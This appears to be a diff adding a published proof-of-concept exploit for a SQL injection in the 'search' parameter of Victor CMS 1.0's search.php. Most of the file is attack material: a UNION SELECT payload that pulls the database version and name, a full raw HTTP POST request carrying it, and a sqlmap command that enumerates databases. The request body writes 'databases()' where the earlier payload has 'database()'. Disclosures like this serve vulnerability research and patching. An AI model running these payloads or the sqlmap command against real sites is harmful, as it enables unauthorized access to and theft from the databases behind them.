@@ -1,0 +1,43 @@
+# Exploit Title: Victor CMS 1.0 - 'Search' SQL Injection
+# Date: 2020-08-04
+# Exploit Author: Edo Maland
+# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
+# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
+# Version: 1.0
+# Tested on: XAMPP / Windows 10
+
+-------------------------------------------------------------------------------------------------------------------------------------
+# Discription:
+# The Victor CMS v1.0 application is vulnerable to SQL injection via the 'search' parameter on the search.php page.
+
+# Feature: Search
+# Vulnerable file: search.php
+# Vulnerable parameter : 
+	- search
+# PoC
+
+Url : http://example.com/CMSsite/search.php
+Methode : Post (search="[SQLi]"&submit)
+
+Payload : 1337'union+select+1,2,version(),database(),5,6,7,8,9,10 -- - 
+
+# Burpsuite Requests
+
+POST /CMSsite/search.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: id,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Origin: http://example.com
+Connection: close
+Referer: http://example.com/CMSsite/search.php
+Cookie: PHPSESSID=lu0nb6l63bleu39pbjf5a954p9
+Upgrade-Insecure-Requests: 1
+
+search=1337'union+select+1,2,version(),databases(),5,6,7,8,9,10%20--%20-&submit=
+
+# Sqlmap Command
+
+sqlmap -u "http://example.com/CMSsite/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
